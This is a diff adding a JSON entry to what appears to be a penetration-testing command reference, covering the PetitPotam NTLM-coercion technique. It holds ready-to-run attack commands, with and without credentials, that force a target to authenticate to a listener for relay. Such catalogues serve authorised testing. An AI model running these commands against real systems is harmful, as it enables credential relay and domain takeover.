@@ -1,0 +1,32 @@
+{
+  "id": "petitpotam",
+  "name": "PetitPotam Coercion",
+  "command": "python3 PetitPotam.py <listener_ip> <target_ip>",
+  "description": "Coerce NTLM authentication from a target using MS-EFSRPC (PetitPotam)",
+  "platform": "linux",
+  "requires": [
+    "no-creds"
+  ],
+  "protocols": [
+    "rpc",
+    "ntlm"
+  ],
+  "tags": [
+    "petitpotam",
+    "coercion",
+    "efsrpc",
+    "ntlm",
+    "relay"
+  ],
+  "variations": [
+    {
+      "label": "With Credentials",
+      "requires": "password",
+      "command": "python3 PetitPotam.py -u '<user>' -p '<password>' -d '<domain>' <listener_ip> <target_ip>"
+    }
+  ],
+  "examples": [
+    "python3 PetitPotam.py 192.168.1.50 192.168.1.100",
+    "python3 PetitPotam.py -u 'user' -p 'password' -d 'corp.local' 192.168.1.50 192.168.1.100"
+  ]
+}
